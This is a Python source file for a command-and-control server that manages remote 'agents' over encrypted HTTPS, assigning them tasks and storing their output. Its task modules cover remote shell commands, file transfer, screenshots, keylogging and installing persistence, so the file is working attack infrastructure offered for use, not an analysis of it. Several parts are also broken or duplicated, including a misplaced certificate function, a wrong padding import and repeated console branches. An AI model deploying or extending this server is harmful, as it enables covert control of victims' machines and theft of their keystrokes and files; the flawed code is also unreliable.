#!/usr/bin/env python3
"""
Command & Control Server
A modular C2 framework for managing remote agents
"""

import os
import sys
import json
import time
import base64
import socket
import logging
import argparse
import threading
import sqlite3
import ssl
import uuid
import hashlib
import random
import string
import http.server
import socketserver
import ssl
import threading
import argparse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class Agent:
    """Class representing a connected agent"""
    def __init__(self, agent_id, hostname, username, os_info, ip_address, first_seen):
        self.agent_id = agent_id
        self.hostname = hostname
        self.username = username
        self.os_info = os_info
        self.ip_address = ip_address
        self.first_seen = first_seen
        self.last_seen = first_seen
        self.tasks = []
        self.results = []
        self.status = "active"
        self.aes_key = None
        self.aes_iv = None

class Task:
    """Class representing a task assigned to an agent"""
    def __init__(self, task_id, agent_id, command, args=None, created=None):
        self.task_id = task_id
        self.agent_id = agent_id
        self.command = command
        self.args = args or {}
        self.created = created or datetime.now().isoformat()
        self.completed = None
        self.status = "pending"
        self.result = None

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """This is a http server that supports threading."""
    pass

class C2RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        path = self.path
        response_data = {"status": "error", "message": "Invalid request"}
        
        try:
            # 1. Agent Registration (Unencrypted Initial Handshake)
            if path == "/register":
                agent_info = json.loads(post_data.decode('utf-8'))
                response_data = self.server.c2_server.register_agent(agent_info, self.client_address[0])
            
            # 2. Command Polling & Result Submission (Encrypted)
            else:
                # Expecting path: /<agent_id>/<action>
                parts = path.strip('/').split('/')
                if len(parts) >= 2:
                    agent_id = parts[0]
                    action = parts[1]
                    
                    # Decrypt incoming data
                    decrypted_req = self.server.c2_server.decrypt_message(agent_id, post_data.decode('utf-8'))
                    
                    if action == "poll":
                        response_raw = self.server.c2_server.get_tasks(agent_id)
                        response_data = self.server.c2_server.encrypt_message(agent_id, response_raw)
                    
                    elif action == "result":
                        task_id = decrypted_req.get('task_id')
                        result_data = decrypted_req.get('result')
                        response_raw = self.server.c2_server.submit_result(agent_id, task_id, result_data)
                        response_data = self.server.c2_server.encrypt_message(agent_id, response_raw)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode('utf-8'))

        except Exception as e:
            logging.error(f"Error handling POST to {path}: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        return  # Keep console clean for the C2 CLI

def generate_self_signed_cert(self, cert_file, key_file):
        """Generates a self-signed certificate for the HTTPS listener"""
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        import datetime

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"c2-internal.local"),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256())

        with open(key_file, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        logging.info(f"Generated self-signed certificate: {cert_file}")

class C2Server:
    """Main Command & Control server class"""
    def __init__(self, config):
        self.config = config
        self.agents = {}
        self.tasks = {}
        self.modules = {}
        self.server = None
        self.running = True
        
        # Generate or load encryption keys
        self.setup_encryption()
        
        # Initialize database
        self.init_database()
        
        # Load modules
        self.load_modules()
        
        # Load any existing agents from database
        self.load_agents()
    
    def setup_encryption(self):
        """Set up encryption keys for secure communication"""
        key_dir = self.config.get('key_dir', 'keys')
        os.makedirs(key_dir, exist_ok=True)
        
        private_key_path = os.path.join(key_dir, 'c2_private.pem')
        public_key_path = os.path.join(key_dir, 'c2_public.pem')
        
        if os.path.exists(private_key_path) and os.path.exists(public_key_path):
            # Load existing keys
            with open(private_key_path, 'rb') as f:
                self.private_key = serialization.load_pem_private_key(
                    f.read(),
                    password=None,
                    backend=default_backend()
                )
            
            with open(public_key_path, 'rb') as f:
                self.public_key = serialization.load_pem_public_key(
                    f.read(),
                    backend=default_backend()
                )
            
            logging.info("Loaded existing encryption keys")
        else:
            # Generate new keys
            self.private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            self.public_key = self.private_key.public_key()
            
            # Save private key
            with open(private_key_path, 'wb') as f:
                f.write(self.private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # Save public key
            with open(public_key_path, 'wb') as f:
                f.write(self.public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ))
            
            logging.info("Generated new encryption keys")
        
        # Get public key in format for agents
        self.public_key_pem = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode('utf-8')
    
    def init_database(self):
        """Initialize SQLite database for storing agents and tasks"""
        db_path = self.config.get('db_path', 'c2_server.db')
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        # Create agents table
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os_info TEXT,
            ip_address TEXT,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT,
            aes_key BLOB,
            aes_iv BLOB
        )
        ''')
        
        # Create tasks table
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            agent_id TEXT,
            command TEXT,
            args TEXT,
            created TEXT,
            completed TEXT,
            status TEXT,
            result TEXT,
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        )
        ''')
        
        # Create results table for large command outputs
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS results (
            result_id TEXT PRIMARY KEY,
            task_id TEXT,
            output TEXT,
            FOREIGN KEY(task_id) REFERENCES tasks(task_id)
        )
        ''')
        
        # Create users table
        self.cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            role TEXT,
            last_login TEXT
        )
        ''')
        
        # Create default admin user if none exists
        self.cursor.execute("SELECT COUNT(*) FROM users")
        if self.cursor.fetchone()[0] == 0:
            default_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            
            self.cursor.execute(
                "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            
            logging.info(f"Created default admin user with password: {default_password}")
            print(f"Created default admin user with password: {default_password}")
        
        self.conn.commit()
    
    def load_modules(self):
        """Load command modules"""
        # Core modules
        self.modules = {
            "shell": {
                "description": "Execute shell command on agent",
                "help": "shell <command> - Execute shell command",
                "needs_args": True
            },
            "upload": {
                "description": "Upload file to agent",
                "help": "upload <local_path> <remote_path> - Upload file to agent",
                "needs_args": True
            },
            "download": {
                "description": "Download file from agent",
                "help": "download <remote_path> <local_path> - Download file from agent",
                "needs_args": True
            },
            "screenshot": {
                "description": "Take screenshot on agent",
                "help": "screenshot [path] - Take screenshot and optionally save to path",
                "needs_args": False
            },
            "keylog": {
                "description": "Start/stop keylogger",
                "help": "keylog start|stop|dump - Control keylogger",
                "needs_args": True
            },
            "persist": {
                "description": "Install persistence mechanism",
                "help": "persist <method> - Install persistence (registry|startup|service|cron)",
                "needs_args": True
            },
            "sleep": {
                "description": "Set agent sleep interval",
                "help": "sleep <seconds> - Set beacon interval",
                "needs_args": True
            },
            "exit": {
                "description": "Terminate agent",
                "help": "exit [cleanup] - Terminate agent with optional cleanup",
                "needs_args": False
            }
        }
        
        # Load custom modules from modules directory
        modules_dir = self.config.get('modules_dir', 'modules')
        if os.path.exists(modules_dir):
            for filename in os.listdir(modules_dir):
                if filename.endswith('.py'):
                    module_name = filename[:-3]
                    try:
                        # Simple module format: JSON file with module definition
                        module_path = os.path.join(modules_dir, filename)
                        with open(module_path, 'r') as f:
                            module_def = json.load(f)
                            self.modules[module_name] = module_def
                            logging.info(f"Loaded module: {module_name}")
                    except Exception as e:
                        logging.error(f"Error loading module {module_name}: {e}")
    
    def load_agents(self):
        """Load existing agents from database"""
        self.cursor.execute("SELECT * FROM agents")
        rows = self.cursor.fetchall()
        
        for row in self.cursor.fetchall():
            agent_id, hostname, username, os_info, ip_address, first_seen, last_seen, status, aes_key, aes_iv = row
            
            agent = Agent(agent_id, hostname, username, os_info, ip_address, first_seen)
            agent.last_seen = last_seen
            agent.status = status
            agent.aes_key = aes_key
            agent.aes_iv = aes_iv
            
            self.agents[agent_id] = agent
            
            # Load pending tasks for this agent
            self.cursor.execute(
                "SELECT * FROM tasks WHERE agent_id = ? AND status = 'pending'",
                (agent_id,)
            )
            
            for task_row in self.cursor.fetchall():
                task_id, agent_id, command, args_json, created, completed, status, result = task_row
                
                task = Task(task_id, agent_id, command, json.loads(args_json), created)
                task.status = status
                
                self.tasks[task_id] = task
                agent.tasks.append(task_id)
        
        logging.info(f"Loaded {len(self.agents)} existing agents")
    
    def register_agent(self, agent_data, remote_addr):
        """Register a new agent or update existing one"""
        agent_id = agent_data.get('agent_id')
        
        if not agent_id:
            # New agent, generate ID
            agent_id = str(uuid.uuid4())
        
        hostname = agent_data.get('hostname', 'unknown')
        username = agent_data.get('username', 'unknown')
        os_info = agent_data.get('os_info', 'unknown')
        ip_address = remote_addr
        current_time = datetime.now().isoformat()
        
        if agent_id in self.agents:
            # Existing agent, update
            agent = self.agents[agent_id]
            agent.hostname = hostname
            agent.username = username
            agent.os_info = os_info
            agent.ip_address = ip_address
            agent.last_seen = current_time
            agent.status = "active"
            
            # Update in database
            self.cursor.execute('''
                UPDATE agents 
                SET hostname = ?, username = ?, os_info = ?, ip_address = ?, 
                    last_seen = ?, status = ?
                WHERE agent_id = ?
            ''', (
                hostname, username, os_info, ip_address, 
                current_time, "active", agent_id
            ))
            
            logging.info(f"Updated agent: {agent_id} ({hostname})")
        else:
            # New agent
            agent = Agent(agent_id, hostname, username, os_info, ip_address, current_time)
            
            # Generate AES key and IV for this agent
            agent.aes_key = os.urandom(32)  # 256-bit key
            agent.aes_iv = os.urandom(16)   # 128-bit IV
            
            # Store in database
            self.cursor.execute('''
                INSERT INTO agents 
                (agent_id, hostname, username, os_info, ip_address, first_seen, last_seen, status, aes_key, aes_iv)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id, hostname, username, os_info, ip_address, 
                current_time, current_time, "active", agent.aes_key, agent.aes_iv
            ))
            
            self.agents[agent_id] = agent
            logging.info(f"Registered new agent: {agent_id} ({hostname})")
        
        self.conn.commit()
        
        # Return agent ID and encryption key
        response = {
            'agent_id': agent_id,
            'aes_key': base64.b64encode(agent.aes_key).decode('utf-8'),
            'aes_iv': base64.b64encode(agent.aes_iv).decode('utf-8')
        }
        
        return response
    
    def get_tasks(self, agent_id):
        """Get pending tasks for an agent"""
        if agent_id not in self.agents:
            return {'error': 'Agent not found'}
        
        agent = self.agents[agent_id]
        agent.last_seen = datetime.now().isoformat()
        
        # Update last seen in database
        self.cursor.execute(
            "UPDATE agents SET last_seen = ?, status = ? WHERE agent_id = ?",
            (agent.last_seen, "active", agent_id)
        )
        self.conn.commit()
        
        # Get pending tasks
        pending_tasks = []
        
        self.cursor.execute(
            "SELECT task_id, command, args, created FROM tasks WHERE agent_id = ? AND status = 'pending'",
            (agent_id,)
        )
        
        for row in self.cursor.fetchall():
            task_id, command, args_json, created = row
            
            task = {
                'task_id': task_id,
                'command': command,
                'args': json.loads(args_json),
                'created': created
            }
            
            pending_tasks.append(task)
        
        return {'tasks': pending_tasks}
    
    def submit_result(self, agent_id, task_id, result_data):
        """Process task result from agent"""
        if agent_id not in self.agents:
            return {'error': 'Agent not found'}
        
        if task_id not in self.tasks:
            return {'error': 'Task not found'}
        
        task = self.tasks[task_id]
        
        # Update task status
        task.status = "completed"
        task.completed = datetime.now().isoformat()
        
        # Handle large results
        result_text = result_data.get('output', '')
        if len(result_text) > 1000:
            # Store large result in separate table
            result_id = str(uuid.uuid4())
            self.cursor.execute(
                "INSERT INTO results (result_id, task_id, output) VALUES (?, ?, ?)",
                (result_id, task_id, result_text)
            )
            task.result = f"Result stored with ID: {result_id}"
        else:
            task.result = result_text
        
        # Update task in database
        self.cursor.execute('''
            UPDATE tasks 
            SET status = ?, completed = ?, result = ?
            WHERE task_id = ?
        ''', (
            task.status, task.completed, task.result, task_id
        ))
        
        self.conn.commit()
        
        logging.info(f"Received result for task {task_id} from agent {agent_id}")
        
        return {'status': 'success'}
    
    def create_task(self, agent_id, command, args=None):
        """Create a new task for an agent"""
        if agent_id not in self.agents:
            return {'error': 'Agent not found'}
        
        if command not in self.modules:
            return {'error': 'Unknown command'}
        
        # Validate arguments if needed
        module = self.modules[command]
        if module.get('needs_args', False) and not args:
            return {'error': f"Command '{command}' requires arguments"}
        
        # Create task
        task_id = str(uuid.uuid4())
        created = datetime.now().isoformat()
        
        task = Task(task_id, agent_id, command, args, created)
        self.tasks[task_id] = task
        
        # Add to agent's task list
        agent = self.agents[agent_id]
        agent.tasks.append(task_id)
        
        # Store in database
        self.cursor.execute('''
            INSERT INTO tasks (task_id, agent_id, command, args, created, status)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            task_id, agent_id, command, json.dumps(args), created, "pending"
        ))
        
        self.conn.commit()
        
        logging.info(f"Created task {task_id} for agent {agent_id}: {command}")
        
        return {'task_id': task_id, 'status': 'created'}
    
    def encrypt_message(self, agent_id, message):
        """Encrypt a message for an agent using its AES key"""
        if agent_id not in self.agents:
            return None
        
        agent = self.agents[agent_id]
        
        if not agent.aes_key or not agent.aes_iv:
            return None
        
        # Convert message to JSON and then to bytes
        message_bytes = json.dumps(message).encode('utf-8')
        
        # Pad the message to be a multiple of 16 bytes (AES block size)
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(message_bytes) + padder.finalize()
        
        # Create cipher
        cipher = Cipher(
            algorithms.AES(agent.aes_key),
            modes.CBC(agent.aes_iv),
            backend=default_backend()
        )
        
        # Encrypt
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Return base64 encoded encrypted data
        return base64.b64encode(encrypted_data).decode('utf-8')
    
    def decrypt_message(self, agent_id, encrypted_message):
        """Decrypt a message from an agent using its AES key"""
        if agent_id not in self.agents:
            return None
        
        agent = self.agents[agent_id]
        
        if not agent.aes_key or not agent.aes_iv:
            return None
        
        try:
            # Decode base64
            encrypted_data = base64.b64decode(encrypted_message)
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(agent.aes_key),
                modes.CBC(agent.aes_iv),
                backend=default_backend()
            )
            
            # Decrypt
            decryptor = cipher.decryptor()
            padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
            
            # Unpad
            unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()
            
            # Parse JSON
            return json.loads(data.decode('utf-8'))
        except Exception as e:
            logging.error(f"Error decrypting message: {e}")
            return None
    
    def start(self):
        """Start the C2 server"""
        host = self.config.get('host', '0.0.0.0')
        port = self.config.get('port', 8443)
        use_ssl = self.config.get('use_ssl', True)
        
        # Create server
        self.server = ThreadedHTTPServer((host, port), C2RequestHandler)
        self.server.c2_server = self
        
        # Set up SSL if enabled
        if use_ssl:
            cert_file = self.config.get('cert_file', 'keys/server.crt')
            key_file = self.config.get('key_file', 'keys/server.key')
            
            # Generate self-signed certificate if it doesn't exist
            if not os.path.exists(cert_file) or not os.path.exists(key_file):
                self.generate_self_signed_cert(cert_file, key_file)
            
            self.server.socket = ssl.wrap_socket(
                self.server.socket,
                server_side=True,
                certfile=cert_file,
                keyfile=key_file,
                ssl_version=ssl.PROTOCOL_TLS
            )
        
        logging.info(f"Starting C2 server on {host}:{port} (SSL: {use_ssl})")
        
        # Start server in a separate thread
        server_thread = threading.Thread(target=self.server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Start cleanup thread
        cleanup_thread = threading.Thread(target=self.cleanup_thread)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        # Start console interface
        self.console_interface()
    
    def cleanup_thread(self):
        """Thread to clean up inactive agents"""
        while self.running:
            try:
                current_time = datetime.now()
                inactive_threshold = self.config.get('inactive_threshold', 3600)  # 1 hour default
                
                for agent_id, agent in list(self.agents.items()):
                    last_seen = datetime.fromisoformat(agent.last_seen)
                    seconds_since_last_seen = (current_time - last_seen).total_seconds()
                    
                    if seconds_since_last_seen > inactive_threshold and agent.status == "active":
                        # Mark agent as inactive
                        agent.status = "inactive"
                        self.cursor.execute(
                            "UPDATE agents SET status = ? WHERE agent_id = ?",
                            ("inactive", agent_id)
                        )
                        logging.info(f"Agent {agent_id} marked as inactive")
                
                self.conn.commit()
            except Exception as e:
                logging.error(f"Error in cleanup thread: {e}")
            
            time.sleep(60)  # Check every minute
    
    def console_interface(self):
        """Simple console interface for controlling the C2 server"""
        print("\nCommand & Control Server Console")
        print("Type 'help' for available commands\n")
        
        while self.running:
            try:
                cmd = input("C2> ").strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == "help":
                    print("\nAvailable commands:")
                    print("  agents                - List all agents")
                    print("  info <agent_id>       - Show agent details")
                    print("  tasks <agent_id>      - Show tasks for agent")
                    print("  task <agent_id> <cmd> - Create new task")
                    print("  result <task_id>      - Show task result")
                    print("  modules               - List available modules")
                    print("  users                 - List users")
                    print("  adduser <username>    - Add new user")
                    print("  deluser <username>    - Delete user")
                    print("  exit                  - Exit server")
                
                elif command == "agents":
                    print("\nConnected Agents:")
                    print(f"{'ID':<36} {'Hostname':<20} {'Username':<15} {'IP Address':<15} {'Status':<10} {'Last Seen':<20}")
                    print("-" * 120)
                    
                    for agent_id, agent in self.agents.items():
                        print(f"{agent_id:<36} {agent.hostname:<20} {agent.username:<15} {agent.ip_address:<15} {agent.status:<10} {agent.last_seen:<20}")
                
                elif command == "info" and len(parts) > 1:
                    agent_id = parts[1]
                    if agent_id in self.agents:
                        agent = self.agents[agent_id]
                        print(f"\nAgent Details: {agent_id}")
                        print(f"  Hostname:   {agent.hostname}")
                        print(f"  Username:   {agent.username}")
                        print(f"  OS Info:    {agent.os_info}")
                        print(f"  IP Address: {agent.ip_address}")
                        print(f"  First Seen: {agent.first_seen}")
                        print(f"  Last Seen:  {agent.last_seen}")
                        print(f"  Status:     {agent.status}")
                        print(f"  Tasks:      {len(agent.tasks)}")
                    else:
                        print(f"Agent not found: {agent_id}")
                
                elif command == "tasks" and len(parts) > 1:
                    agent_id = parts[1]
                    if agent_id in self.agents:
                        agent = self.agents[agent_id]
                        print(f"\nTasks for Agent: {agent_id}")
                        print(f"{'Task ID':<36} {'Command':<15} {'Status':<10} {'Created':<20} {'Completed':<20}")
                        print("-" * 105)
                        
                        self.cursor.execute(
                            "SELECT task_id, command, status, created, completed FROM tasks WHERE agent_id = ?",
                            (agent_id,)
                        )
                        
                        for row in self.cursor.fetchall():
                            task_id, command, status, created, completed = row
                            completed = completed or ""
                            print(f"{task_id:<36} {command:<15} {status:<10} {created:<20} {completed:<20}")
                    else:
                        print(f"Agent not found: {agent_id}")
                
                elif command == "task" and len(parts) > 2:
                    agent_id = parts[1]
                    task_command = parts[2]
                    task_args = " ".join(parts[3:]) if len(parts) > 3 else None
                    
                    result = self.create_task(agent_id, task_command, task_args)
                    if 'error' in result:
                        print(f"Error: {result['error']}")
                    else:
                        print(f"Task created: {result['task_id']}")
                
                elif command == "result" and len(parts) > 1:
                    task_id = parts[1]
                    
                    self.cursor.execute(
                        "SELECT agent_id, command, status, created, completed, result FROM tasks WHERE task_id = ?",
                        (task_id,)
                    )
                    
                    row = self.cursor.fetchone()
                    if row:
                        agent_id, command, status, created, completed, result = row
                        
                        print(f"\nTask Result: {task_id}")
                        print(f"  Agent:     {agent_id}")
                        print(f"  Command:   {command}")
                        print(f"  Status:    {status}")
                        print(f"  Created:   {created}")
                        print(f"  Completed: {completed or 'N/A'}")
                        
                        if "Result stored with ID:" in str(result):
                            # Retrieve from results table
                            result_id = result.split(": ")[1]
                            self.cursor.execute(
                                "SELECT output FROM results WHERE result_id = ?",
                                (result_id,)
                            )
                            result_row = self.cursor.fetchone()
                            if result_row:
                                result = result_row[0]
                        
                        print("\nOutput:")
                        print("-" * 80)
                        print(result or "No output")
                        print("-" * 80)
                    else:
                        print(f"Task not found: {task_id}")
                
                elif command == "modules":
                    print("\nAvailable Modules:")
                    print(f"{'Name':<15} {'Description':<50}")
                    print("-" * 65)
                    
                    for name, module in sorted(self.modules.items()):
                        print(f"{name:<15} {module.get('description', ''):<50}")
                
                elif command == "users":
                    print("\nUsers:")
                    print(f"{'Username':<20} {'Role':<10} {'Last Login':<20}")
                    print("-" * 55)
                    
                    self.cursor.execute("SELECT username, role, last_login FROM users")
                    for row in self.cursor.fetchall():
                        username, role, last_login = row
                        last_login = last_login or "Never"
                        print(f"{username:<20} {role:<10} {last_login:<20}")
                
                elif command == "adduser" and len(parts) > 1:
                    username = parts[1]
                    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                    password_hash = hashlib.sha256(password.encode()).hexdigest()
                    role = parts[2] if len(parts) > 2 else "user"
                    
                    try:
                        self.cursor.execute(
                            "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                            (username, password_hash, role)
                        )
                        self.conn.commit()
                        print(f"User '{username}' created with password: {password}")
                    except sqlite3.IntegrityError:
                        print(f"User '{username}' already exists")
                
                elif command == "deluser" and len(parts) > 1:
                    username = parts[1]
                    
                    self.cursor.execute("DELETE FROM users WHERE username = ?", (username,))
                    if self.cursor.rowcount > 0:
                        self.conn.commit()
                        print(f"User '{username}' deleted")
                    else:
                        print(f"User '{username}' not found")
                
                elif command == "exit":
                    print("Shutting down server...")
                    self.running = False
                    if self.server:
                        self.server.shutdown()

                elif command == "result" and len(parts) > 1:
                    task_id = parts[1]
                    
                    self.cursor.execute(
                        "SELECT agent_id, command, status, created, completed, result FROM tasks WHERE task_id = ?",
                        (task_id,)
                    )
                    
                    row = self.cursor.fetchone()
                    if row:
                        agent_id, command, status, created, completed, result = row
                        print(f"\nTask Result: {task_id}")
                        print(f"  Agent:     {agent_id}")
                        print(f"  Command:   {command}")
                        print(f"  Status:    {status}")
                        print(f"  Created:   {created}")
                        print(f"  Completed: {completed or 'N/A'}")
                        print("-" * 40)
                        
                        # Check if result is a reference to the results table
                        if result and result.startswith("Result stored with ID:"):
                            res_id = result.split(": ")[1]
                            self.cursor.execute("SELECT output FROM results WHERE result_id = ?", (res_id,))
                            res_row = self.cursor.fetchone()
                            if res_row:
                                print(f"Output:\n{res_row[0]}")
                        else:
                            print(f"Output:\n{result}")
                    else:
                        print(f"Task ID not found: {task_id}")

                elif command == "modules":
                    print("\nAvailable Modules:")
                    print(f"{'Module':<15} {'Description':<40}")
                    print("-" * 55)
                    for name, mod in self.modules.items():
                        print(f"{name:<15} {mod['description']:<40}")

                elif command == "users":
                    print("\nSystem Users:")
                    self.cursor.execute("SELECT username, role, last_login FROM users")
                    for user in self.cursor.fetchall():
                        print(f"Username: {user[0]:<15} Role: {user[1]:<10} Last Login: {user[2] or 'Never'}")

                elif command == "adduser" and len(parts) > 1:
                    new_user = parts[1]
                    new_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                    pw_hash = hashlib.sha256(new_pass.encode()).hexdigest()
                    try:
                        self.cursor.execute("INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)", 
                                           (new_user, pw_hash, "user"))
                        self.conn.commit()
                        print(f"User {new_user} added. Password: {new_pass}")
                    except sqlite3.IntegrityError:
                        print("Error: User already exists.")

                elif command == "deluser" and len(parts) > 1:
                    target_user = parts[1]
                    if target_user == "admin":
                        print("Cannot delete the primary admin account.")
                    else:
                        self.cursor.execute("DELETE FROM users WHERE username = ?", (target_user,))
                        self.conn.commit()
                        print(f"User {target_user} deleted.")

                elif command == "exit":
                    print("Shutting down C2 server...")
                    self.running = False
                    if self.server:
                        self.server.shutdown()
                    sys.exit(0)

                else:
                    if command not in ["help", "agents", "info", "tasks", "task", "result", "modules", "users", "adduser", "deluser"]:
                        print(f"Unknown command: {command}. Type 'help' for options.")

            except KeyboardInterrupt:
                print("\nUse 'exit' to safely shut down the server.")
            except Exception as e:
                logging.error(f"Console Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Modular C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Listen host")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--no-ssl", action="store_false", dest="use_ssl", help="Disable SSL")
    parser.set_defaults(use_ssl=True)
    
    args = parser.parse_args()

    config = {
        'host': args.host,
        'port': args.port,
        'use_ssl': args.use_ssl,
        'key_dir': 'keys',
        'db_path': 'c2_server.db',
        'modules_dir': 'modules',
        'inactive_threshold': 3600
    }

    if not os.path.exists(config['modules_dir']):
        os.makedirs(config['modules_dir'])

    c2 = C2Server(config)
    
    try:
        c2.start()
    except Exception as e:
        logging.critical(f"Failed to start server: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
